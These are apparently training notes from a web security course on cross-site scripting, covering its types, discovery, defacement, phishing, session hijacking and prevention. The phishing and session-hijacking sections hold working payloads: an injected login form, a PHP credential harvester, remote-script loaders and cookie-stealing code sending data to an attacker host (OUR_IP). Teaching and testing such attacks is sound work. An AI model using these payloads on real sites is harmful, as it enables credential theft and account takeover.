
# XSS Basics 

## Intro to XSS

### What is XSS?

- Vulnerability where improper input sanitization allows **JavaScript injection** into a webpage.
- Malicious JS executes in **victim’s browser**, not on the server.
- Risk level = **medium**
    
    - Low impact (client-side only)
    - High probability (very common)

### How XSS Works

- Web app renders HTML from server.
- If user input isn’t sanitized:
    
    - Attacker injects JS (e.g., in comments).
    - Other users loading the page **execute the attacker’s code**.
        
### XSS Attack Capabilities

- Steal cookies/session tokens.
- Perform unwanted API actions (e.g., change password).
- Display ads, crypto-mining.
- With browser exploits: can escape sandbox and run system code.
- Limited by:
    
    - Browser JS engine (e.g., V8)
    - Same-origin policy (modern browsers)
    
### Historical XSS Examples

- **Samy Worm (MySpace, 2005):** Stored XSS worm → 1M+ profiles infected in 1 day.
- **TweetDeck (2014):** Self-retweeting XSS → 38,000 retweets in 2 minutes.
- **Google Search XSS (2019):** Flaw in XML library.
- **Apache Server XSS:** Exploited to steal passwords.

**Takeaway:** Even major platforms regularly suffer XSS; prevention is essential.

### Types of XSS

|Type|Description|
|---|---|
|**Stored (Persistent)**|User input is saved in backend (DB) and later shown (e.g., posts/comments). **Most critical.**|
|**Reflected (Non-Persistent)**|Input is returned immediately in response without storage (e.g., search queries, error messages).|
|**DOM-Based**|Happens **entirely client-side**; input is handled by browser JavaScript without contacting server (e.g., anchor tags, client-side params).|

## Stored XSS
### What is Stored (Persistent) XSS?

- Injected payload is **saved in the backend database**.
- Payload executes whenever **any user** loads the affected page.
- Most critical type of XSS because:
    
    - Affects **all visitors**.
    - Hard to remove (must delete payload from DB).

### Example Scenario

- Simple To-Do List app displays user input.
- If input is not sanitized, injection is possible.
- Testing payload:

	 `<script>alert(window.origin)</script>`
    
- Successful payload produces a JS alert showing the page’s origin.
    
### Confirmation Steps

1. Enter XSS payload.
2. Check if alert appears → XSS executed.
3. View page source (CTRL+U):
4. `<script>alert(window.origin)</script>
5. Refresh the page:
    - If alert appears again → **Stored XSS confirmed**.
### Purpose of `window.origin` in payload

- Helps confirm **which domain/page** executes the payload.
- Useful where input is handled inside **cross-domain IFRAMES**.
    
### Alternative XSS Payloads (when alert() is blocked)

- `<plaintext>` → stops HTML rendering and shows raw page output.
- `<script>print()</script>` → triggers browser print dialog.
    
### Impact

- Every visitor triggers the attack.
- Persistent until removed from backend.
- High security risk due to widespread impact.

## Reflected XSS

### What is Reflected XSS?

- A type of **Non-Persistent** XSS.
- Input is:
    
    1. Sent to the **backend server**
    2. Immediately **returned in the response**
    3. Displayed without sanitization
        
- Only affects **the user who triggers it** (not stored, disappears after navigating away).
    
### How Reflected XSS Works

- User input appears in:
    
    - Error messages
    - Confirmation messages
    - Search results
        
- If echoed without sanitization, injected JS executes.
    
### Testing Reflected XSS

Payload:

	`<script>alert(window.origin)</script>`

- Enter payload → click _Add_ → popup appears → vulnerability confirmed.
- Viewing page source shows the injected script included in the response:

	`Task '<script>alert(window.origin)</script>' could not be added.`


### Why It’s Non-Persistent

- On page refresh or revisit, the message is gone → payload does not execute again.
- Confirms it’s a **temporary reflection**, not stored in backend.
    
### How to Attack a Victim

- Depends on the HTTP method used.

#### Using Firefox Developer Tools

- Open Network tab.
- Submit payload
- Observe the request → **GET request**.
    - GET parameters appear in the **URL**.

#### Exploitation

- Copy full URL containing the payload:
    
    - From browser address bar
    - Or Network tab → right-click → Copy URL

- Send URL to victim.
- When they open it → payload executes.
    
### Key Points

- Reflected XSS is **triggered via crafted links**.
- Common for phishing-style attacks.
- Not stored → only executed when URL with payload is visited.

## DOM XSS 

### What is DOM-based XSS?

- A **Non-Persistent** XSS type.
- Entirely **processed on the client side** through JavaScript.
- Does **not** send input to the backend server.
- Triggered when JS modifies the page using DOM functions.
    
### Identifying DOM XSS

 **Signs**

1. **No network requests** when entering data (checked via Network tab).
2. Input appears in the URL after a **# (fragment identifier)** → client-side parameter.
3. Page source (`CTRL+U`) does **not** show the input.
4. Rendering only occurs in the DOM after page load (check via Inspector).

### Source & Sink

#### Source

- Where user input comes from.
- Example from script:

	 `var pos = document.URL.indexOf("task="); var task = document.URL.substring(pos + 5);`
    

#### Sink

- Function that writes user input to the page.
- Vulnerable sinks:
    
    - `document.write()`
    - `element.innerHTML`
    - `element.outerHTML`
        
- jQuery sinks:
    
    - `add()`, `after()`, `append()`
        

### Example sink used:

`document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);`

- No sanitization → **DOM XSS vulnerability**.
    
### Why `<script>` payload doesn’t work

- `innerHTML` prevents execution of `<script>` tags.
- Use alternative payloads instead.

### DOM XSS Payload Example

	`<img src="" onerror=alert(window.origin)>`

- Image fails to load → `onerror` executes JS.
- Works without `<script>` tag.

### Exploitation

- Place payload in the fragment or client-side parameter:
- `?task=<img src="" onerror=alert(window.origin)>`
- Send crafted URL to victim.
- When victim loads it → payload executes in browser

## XSS Discovery 

 **Purpose**

- Detect XSS vulnerabilities before exploiting them.
- XSS is widespread → many automated + manual methods exist.
    
### Automated Discovery

#### Web Vulnerability Scanners

- Tools: **Nessus, Burp Pro, OWASP ZAP**, etc.
- Perform:
    
    - **Passive scan** → analyzes client-side code for DOM XSS.
    - **Active scan** → injects payloads and checks if they execute.
    
#### Open-source XSS Tools

- **XSStrike**
- **Brute XSS**
- **XSSer**

#### Example (XSStrike):

	`python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"`

**Findings:**

- DOM check
- Reflection found
- Payload generated successfully
- Parameter flagged as vulnerable

**Note:** Automated tools may detect reflections, but output must be manually verified to confirm actual execution.

### Manual Discovery

#### Payload Testing

- Test various XSS payloads from lists such as:
    
    - **PayloadAllTheThings**
    - **PayloadBox**
        
- Payloads may target:
    
    - HTML inputs
    - URL parameters
    - HTTP headers (User-Agent, Cookie)

**Important:**  
Most payloads don’t work unless they match:

- Injection point context (HTML attribute, tag body, JS context, etc.)
- Filter bypass needed
- Browser nuances

Therefore manual testing can be slow and inefficient.

### Custom Scripting

- Write Python scripts to:
    
    - Send payloads automatically
    - Compare server response or DOM output
        
- Useful when scanners fail or when custom input handling exists.

### Code Review

- Most reliable XSS detection method.
- Inspect **backend + frontend**:
    
    - Trace how input is handled.
    - Identify unsafe sinks (e.g., `innerHTML`, `document.write`).
    - Determine where sanitization is missing.
        
- Automated tools often miss vulnerabilities in:
    
    - Complex apps
    - Filter-heavy apps
    - Custom input processing environments
        
- Manual analysis may uncover vulnerabilities even in widely-used applications.


# XSS Attacks
## Defacing  

### What is Defacing?

- Changing the **appearance of a website** using injected JavaScript.
- Commonly done through **Stored XSS**, since it:
    
    - Affects all visitors.
    - Persists across refreshes.
    - Creates maximum visibility (similar to real-world hacks like the UK NHS defacement in 2018).
    
### Elements Commonly Modified in Defacements

1. **Background color**  
    `document.body.style.background`
    
2. **Background image**  
    `document.body.background`
    
3. **Page title**  
    `document.title`
    
4. **Page text / HTML content**  
    `element.innerHTML` or `document.body.innerHTML`
    
### Changing Background

#### Color:

`<script>document.body.style.background = "#141d2b"</script>`

#### Image:

`<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>`

Effect: persistent page modification via Stored XSS.

### Changing Page Title

`<script>document.title = 'HackTheBox Academy'</script>`

### Changing Page Text

#### Modify a single element:

`document.getElementById("todo").innerHTML = "New Text"`

#### Replace entire page:

`<script>document.getElementsByTagName('body')[0].innerHTML = "New Text"</script>`

- Can use jQuery alternatives like `$("#todo").html(...)` if jQuery is available.
    
### Full Defacement Example

**HTML inserted:**

`<center>   <h1 style="color: white">Cyber Security Training</h1>   <p style="color: white">by      <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px">   </p> </center>`

**Final injected payload:**

`<script> document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px"></p></center>' </script>`

### Result

- Page appears fully defaced.
- Original HTML still present in source code, but **overwritten visually** by JavaScript at runtime.
- Defacement persists for all visitors because it's a **Stored XSS** payload.

## Phishing 

### Purpose

- Use XSS to inject **fake login forms** into a trusted webpage.
- Trick victims into sending credentials to the attacker.
- Useful for:
    
    - Real attacks
    - Phishing simulations
    - Security awareness assessments

### Step 1 — Discover XSS

- Target: `/phishing` image viewer app.
- Basic payload fails → must find a payload that successfully executes JS.
- Inspect how the input is reflected in the source to choose correct payload.

### Step 2 — Inject a Login Form

**Example form:**

`<h3>Please login to continue</h3> <form action=http://OUR_IP>   <input type="username" name="username">   <input type="password" name="password">   <input type="submit" value="Login"> </form>`

- `OUR_IP` = attacker machine IP (from `ip a`, tun0).
    

#### Insert the form using JavaScript (XSS):

`document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username"><input type="password" name="password"><input type="submit" value="Login"></form>');`



### Step 3 — Remove Original Page Elements

- Identify the element to remove using Inspector (CTRL+SHIFT+C).
- Example form has:

	`<form id='urlform'>`

- Remove via JS:

	`document.getElementById('urlform').remove();`

#### Combined payload:

`document.write('...login form HTML...');document.getElementById('urlform').remove();`

#### Hide remaining page content

Append:

`<!--`

→ Comments out the rest of the page.


### Step 4 — Serve the Malicious URL

- This is a **Reflected XSS** attack → payload is placed inside the URL parameters.
- Send the crafted URL to the victim.
    
### Step 5 — Capture Credentials

Victim submits the form → browser sends:

	`GET /?username=test&password=test HTTP/1.1`

#### Temporary Testing

Start listener:

	`sudo nc -lvnp 80`

- Receives credentials but shows an error to the victim (“site can’t be reached”).
    
### Step 6 — Use a PHP Credential Harvester

Create `index.php`:

`<?php if (isset($_GET['username']) && isset($_GET['password'])) {     $file = fopen("creds.txt", "a+");     fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");     header("Location: http://SERVER_IP/phishing/index.php");     fclose($file);     exit(); } ?>`

**Start PHP server:**

`mkdir /tmp/tmpserver cd /tmp/tmpserver sudo php -S 0.0.0.0:80`

#### Result

- Victim logs in.
- Redirected to the real page (looks normal).
- Attacker gets:

`Username: test | Password: test`

### Final Outcome

- Attacker has fully functional phishing setup via XSS.
- Victim sees a legit-looking login page.
- Credentials are stored discreetly and attacker gains access.

## Session Hijacking 
### What it is

- Modern web apps use **cookies** to maintain logged-in sessions.
- If an attacker obtains a victim’s cookie, they can **reuse it** to impersonate the victim.
- XSS allows JavaScript to execute in a victim’s browser → **steal cookies remotely**.

### Blind XSS

#### Definition

- XSS that triggers in a location **the attacker cannot see** (e.g., admin panel, reviewer dashboard).

#### Common Blind XSS entry points

- Contact forms
- Reviews
- User profile fields
- Support tickets
- HTTP headers (e.g., User-Agent)

#### Problem

- You cannot view how the injected payload is rendered.

### Detection Method

#### 1. Load a remote script using the injected field

`<script src="http://OUR_IP/username"></script>`

- Whichever field causes the server to request `/username` reveals the **vulnerable field**.
    
#### 2. Test multiple payloads

**Examples:**

`<script src=http://OUR_IP></script> '><script src=http://OUR_IP></script> "><script src=http://OUR_IP></script> javascript:eval('var a=document.createElement("script");a.src="http://OUR_IP";document.body.appendChild(a)') <script>$.getScript("http://OUR_IP")</script>`

#### 3. Run a listener

`sudo php -S 0.0.0.0:80`

### Finding the Vulnerable Field

- Inject remote-script payload **per field**:
    
    - `<script src=http://OUR_IP/fullname></script>`
    - `<script src=http://OUR_IP/username></script>`
        
- If server requests `/username`, the **username field is vulnerable**.
    

### Session Hijacking via XSS

#### JavaScript cookie-stealing payload

Two possible:

`document.location='http://OUR_IP/index.php?c='+document.cookie;`

or:

`new Image().src='http://OUR_IP/index.php?c='+document.cookie;`

- Use the **image payload** (less suspicious).
    

#### Save as script.js on attacker server:

`new Image().src='http://OUR_IP/index.php?c='+document.cookie;`

#### Inject XSS payload:

`<script src=http://OUR_IP/script.js></script>`

#### Attacker’s Cookie-Capture Server

##### index.php

`<?php if (isset($_GET['c'])) {     $list = explode(";", $_GET['c']);     foreach ($list as $value) {         $cookie = urldecode($value);         $file = fopen("cookies.txt", "a+");         fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");         fclose($file);     } } ?>`

##### Start PHP server

`sudo php -S 0.0.0.0:80`

### Result

- Victim loads admin panel containing attacker’s payload.
- Browser loads `script.js` and triggers request:

`/index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2`

- Credentials logged in `cookies.txt`.
    

### Hijacking the Session

1. Visit `/hijacking/login.php`
2. Open **Storage panel** (Shift+F9)
3. Add cookie:
    
    - **Name:** value before `=`
    - **Value:** value after `=`
        
4. Refresh page → logged in as victim.

## XSS Prevention

### Core Idea

Prevent XSS by securing:

- **Source** (user input)
- **Sink** (where input is written to the page)

Requires **input validation**, **input sanitization**, **output encoding**, and **secure server configuration**.

### Front-End Prevention

### Input Validation

- Validate formats (e.g., email regex).
- Reject unexpected formats before submission.

**Example:**

`re.test($("#login input[name=email]").val());`

### Input Sanitization

Use libraries like **DOMPurify** to escape dangerous characters:

`let clean = DOMPurify.sanitize(dirty);`

### Avoid Direct Input in Sensitive Areas

Never place user input inside:

- `<script>`
- `<style>`
- HTML attributes
- HTML comments

Avoid JS/jQuery functions that write raw HTML:

- `innerHTML`, `outerHTML`, `document.write()`, `document.writeln()`, `document.domain`
    
- jQuery: `html()`, `append()`, `prepend()`, `before()`, `after()`, `replaceWith()`, etc.
    
### Back-End Prevention

#### Back-End Validation

Validate input again on server-side (front-end checks are bypassable).  
Example (PHP):

`filter_var($_GET['email'], FILTER_VALIDATE_EMAIL)`

#### Back-End Sanitization

Escape dangerous characters before processing or storing input.

**Example (PHP):**

`addslashes($_GET['email']);`

**Example (NodeJS):**

`DOMPurify.sanitize(dirty);`

#### Output Encoding

Encode special characters so they display safely in HTML.

**PHP examples:**

`htmlspecialchars(); htmlentities();`

**NodeJS example:**

`encode('<'); // → '&lt;'`

## Server-Side Security Measures

- Use **HTTPS**.
- Enable **XSS prevention headers**.
- Use correct **Content-Type** + `nosniff`.
- **Content-Security-Policy** (`script-src 'self'`) to restrict script execution.
- **HttpOnly** + **Secure** cookies prevent JS from reading cookies.
    

A **WAF** or framework-level XSS protections (e.g., ASP.NET) can also block common attack patterns.
### Final Notes

Even with protections:

- XSS can still slip through.
- Continuous testing, code review, and validation are essential.
- Combine **offensive testing** + **defensive coding** for strongest security posture.

